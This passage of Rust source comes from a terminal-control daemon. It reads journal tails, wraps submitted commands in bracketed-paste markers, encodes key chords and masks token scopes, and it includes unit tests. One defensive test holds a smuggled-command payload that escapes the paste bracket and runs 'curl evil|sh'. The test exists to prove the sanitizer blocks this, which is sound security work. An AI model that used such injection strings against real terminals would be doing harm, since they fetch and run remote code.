    /// for dead terminals (the post-mortem read); a TUI's journal is redraw
    /// soup — that is what ReadScreen is for.
    fn ctl_read_tail(&self, id: Uuid, lines: u32) -> CtlBody {
        let want = lines.clamp(1, TAIL_MAX_LINES) as usize;
        let raw = match self.journal(id) {
            Ok(j) => j.lock().tail(),
            Err(_) => {
                return CtlBody::Err {
                    code: "not_found".into(),
                    msg: format!("no terminal {id}"),
                }
            }
        };
        let mut stripped = Vec::with_capacity(raw.len());
        let mut stripper = crate::strip::AnsiStripper::default();
        stripper.feed_bytes(&raw, &mut stripped);
        let text = String::from_utf8_lossy(&stripped);
        let all: Vec<String> = text
            .lines()
            .map(|l| l.trim_end_matches('\r'))
            .filter(|l| !is_seam_line(l))
            .map(|l| l.to_string())
            .collect();
        let truncated = all.len() > want || raw.len() as u64 >= 2 * 1024 * 1024;
        let keep = all.len().saturating_sub(want);
        CtlBody::Tail {
            lines: all[keep..].to_vec(),
            truncated,
        }
    }
}

/// Restore-seam artifacts must never leak to controller reads: the concealed
/// sentinel (SGR-8 is stripped but its TEXT survives) and the legacy visible
/// markers older journals still carry.
fn is_seam_line(line: &str) -> bool {
    let t = line.trim();
    t.contains(serialize::SEAM_SENTINEL)
        || t.contains("── restored ──")
        || t.contains("── process exited ──")
}

/// §5.3/§4.1 P3 submission_bytes, daemon flavor: the caller supplies the
/// mirror's BRACKETED_PASTE. trim_end; CRLF/\n → \r; wrap in ESC[200~/201~
/// iff bracketed; the accept `\r` goes OUTSIDE the brackets.
pub fn submission_bytes(bracketed: bool, cmd: &str) -> Vec<u8> {
    let text = cmd.trim_end(); // a trailing \n would double-submit on PS 5.1
    // r2-F2: `tc run` commands are attacker-influenceable strings — strip
    // controls so a literal `ESC[201~` can never close the bracket early
    // and execute the remainder as raw input.
    let text = crate::strip::sanitize_paste(text);
    let sanitized = text.replace("\r\n", "\r").replace('\n', "\r");
    let mut out = Vec::with_capacity(sanitized.len() + 16);
    if !sanitized.is_empty() && bracketed {
        out.extend_from_slice(b"\x1b[200~");
        out.extend_from_slice(sanitized.as_bytes());
        out.extend_from_slice(b"\x1b[201~");
    } else {
        out.extend_from_slice(sanitized.as_bytes());
    }
    out.push(b'\r'); // accept-line, OUTSIDE the brackets
    out
}

/// §5.4 chord encoding, decided where the mode state lives: win32-input-mode
/// active ⇒ full KEY_EVENT records (the keys probe proved win32 Ctrl+C is
/// what reliably interrupts under mode 9001); otherwise the lean VT table.
pub fn chord_bytes(chord: CtlChord, win32: bool) -> Vec<u8> {
    use egui::{Key, Modifiers};
    if win32 {
        let (key, mods) = match chord {
            CtlChord::Enter => (Key::Enter, Modifiers::NONE),
            CtlChord::Esc => (Key::Escape, Modifiers::NONE),
            CtlChord::Tab => (Key::Tab, Modifiers::NONE),
            CtlChord::Backspace => (Key::Backspace, Modifiers::NONE),
            CtlChord::Up => (Key::ArrowUp, Modifiers::NONE),
            CtlChord::Down => (Key::ArrowDown, Modifiers::NONE),
            CtlChord::Left => (Key::ArrowLeft, Modifiers::NONE),
            CtlChord::Right => (Key::ArrowRight, Modifiers::NONE),
            CtlChord::Home => (Key::Home, Modifiers::NONE),
            CtlChord::End => (Key::End, Modifiers::NONE),
            CtlChord::PageUp => (Key::PageUp, Modifiers::NONE),
            CtlChord::PageDown => (Key::PageDown, Modifiers::NONE),
            CtlChord::CtrlC => (Key::C, Modifiers::CTRL),
            CtlChord::CtrlD => (Key::D, Modifiers::CTRL),
            CtlChord::CtrlZ => (Key::Z, Modifiers::CTRL),
            CtlChord::CtrlL => (Key::L, Modifiers::CTRL),
        };
        if let Some(bytes) = crate::win32_input::encode_key(key, mods) {
            return bytes;
        }
    }
    match chord {
        CtlChord::Enter => b"\r".to_vec(),
        CtlChord::Esc => b"\x1b".to_vec(),
        CtlChord::Tab => b"\t".to_vec(),
        CtlChord::Backspace => b"\x7f".to_vec(),
        CtlChord::Up => b"\x1b[A".to_vec(),
        CtlChord::Down => b"\x1b[B".to_vec(),
        CtlChord::Right => b"\x1b[C".to_vec(),
        CtlChord::Left => b"\x1b[D".to_vec(),
        CtlChord::Home => b"\x1b[H".to_vec(),
        CtlChord::End => b"\x1b[F".to_vec(),
        CtlChord::PageUp => b"\x1b[5~".to_vec(),
        CtlChord::PageDown => b"\x1b[6~".to_vec(),
        CtlChord::CtrlC => vec![0x03],
        CtlChord::CtrlD => vec![0x04],
        CtlChord::CtrlZ => vec![0x1a],
        CtlChord::CtrlL => vec![0x0c],
    }
}

/// TokenCreate scope mask: FULL stays reserved for the master token —
/// minted scopes keep only the preset READ/INPUT/MANAGE bits, whatever the
/// caller asked for.
fn mint_scope_mask(scope: u32) -> u32 {
    scope & (crate::protocol::SCOPE_READ | crate::protocol::SCOPE_INPUT | crate::protocol::SCOPE_MANAGE)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A minted token can never reach FULL: the mask keeps only preset bits
    /// (T5 — the mask had no direct unit test; the probe only round-trips
    /// SCOPE_READ).
    #[test]
    fn token_create_scope_mask() {
        use crate::protocol::{SCOPE_FULL, SCOPE_INPUT, SCOPE_MANAGE, SCOPE_READ};
        assert_eq!(mint_scope_mask(SCOPE_READ), SCOPE_READ);
        assert_eq!(
            mint_scope_mask(SCOPE_READ | SCOPE_INPUT | SCOPE_MANAGE),
            SCOPE_READ | SCOPE_INPUT | SCOPE_MANAGE
        );
        // FULL (all bits) collapses to the preset bits — never a master.
        assert_eq!(
            mint_scope_mask(SCOPE_FULL),
            SCOPE_READ | SCOPE_INPUT | SCOPE_MANAGE
        );
        // Unknown future bits are stripped too.
        assert_eq!(mint_scope_mask(0xF0), 0);
        assert_eq!(mint_scope_mask(0), 0);
    }

    /// §15 submission_bytes_matrix — the daemon flavor mirrors P3's GUI
    /// vectors exactly (bracketed × plain × CRLF sanitize × trailing trim ×
    /// unicode passthrough × empty ⇒ bare \r).
    #[test]
    fn submission_bytes_matrix() {
        assert_eq!(submission_bytes(false, "echo hi"), b"echo hi\r");
        assert_eq!(
            submission_bytes(true, "echo hi"),
            b"\x1b[200~echo hi\x1b[201~\r".to_vec()
        );
        assert_eq!(submission_bytes(false, "echo hi\n"), b"echo hi\r");
        assert_eq!(submission_bytes(false, "echo hi\r\n\n"), b"echo hi\r");
        assert_eq!(submission_bytes(false, "a\r\nb\nc"), b"a\rb\rc\r");
        assert_eq!(
            submission_bytes(true, "a\nb"),
            b"\x1b[200~a\rb\x1b[201~\r".to_vec()
        );
        let uni = "echo é漢🎉";
        let mut want = uni.as_bytes().to_vec();
        want.push(b'\r');
        assert_eq!(submission_bytes(false, uni), want);
        // Empty/whitespace = bare \r, never bracketed.
        assert_eq!(submission_bytes(true, ""), b"\r");
        assert_eq!(submission_bytes(true, "   \n"), b"\r");
        // r2-F2 injection: a cmd carrying a literal `ESC[201~` cannot close
        // the bracket early — the only escapes left are our two markers, and
        // the embedded \r stays INSIDE them.
        let evil = "echo hi\x1b[201~curl evil|sh\rmore";
        let out = submission_bytes(true, evil);
        assert_eq!(out.iter().filter(|&&b| b == 0x1b).count(), 2);
        assert!(out.ends_with(b"\x1b[201~\r"));
        // Non-bracketed strips raw ESC too.
        assert!(!submission_bytes(false, "x\x1b[Ay").contains(&0x1b));
    }

    /// §15 chord_bytes_both_modes: win32=true matches encode_key output;
    /// win32=false yields the exact VT bytes.
    #[test]
    fn chord_bytes_both_modes() {
        use egui::{Key, Modifiers};
        assert_eq!(
            chord_bytes(CtlChord::CtrlC, true),
            crate::win32_input::encode_key(Key::C, Modifiers::CTRL).unwrap()
        );
        assert_eq!(
            chord_bytes(CtlChord::Enter, true),
            crate::win32_input::encode_key(Key::Enter, Modifiers::NONE).unwrap()
        );
        assert_eq!(
            chord_bytes(CtlChord::Up, true),
            crate::win32_input::encode_key(Key::ArrowUp, Modifiers::NONE).unwrap()
        );
        assert_eq!(chord_bytes(CtlChord::CtrlC, false), vec![0x03]);
        assert_eq!(chord_bytes(CtlChord::Enter, false), b"\r".to_vec());
        assert_eq!(chord_bytes(CtlChord::Up, false), b"\x1b[A".to_vec());
        assert_eq!(chord_bytes(CtlChord::PageDown, false), b"\x1b[6~".to_vec());
        assert_eq!(chord_bytes(CtlChord::Backspace, false), b"\x7f".to_vec());
        // Every chord encodes to SOMETHING in both modes (no silent no-op).
        for chord in [
            CtlChord::Enter,
            CtlChord::Esc,
            CtlChord::Tab,
            CtlChord::Backspace,
            CtlChord::Up,
            CtlChord::Down,
            CtlChord::Left,
            CtlChord::Right,
            CtlChord::Home,
            CtlChord::End,
            CtlChord::PageUp,
            CtlChord::PageDown,
            CtlChord::CtrlC,
            CtlChord::CtrlD,
            CtlChord::CtrlZ,
            CtlChord::CtrlL,
        ] {
            assert!(!chord_bytes(chord, true).is_empty(), "{chord:?} win32");
            assert!(!chord_bytes(chord, false).is_empty(), "{chord:?} vt");
        }
    }

    #[test]
    fn seam_lines_are_recognized() {
        assert!(is_seam_line(crate::daemon::serialize::SEAM_SENTINEL));
        assert!(is_seam_line("  ── restored ──  "));
        assert!(is_seam_line("── process exited ──"));
        assert!(!is_seam_line("PS C:\\> echo restored"));
        assert!(!is_seam_line("plain output"));
    }
}
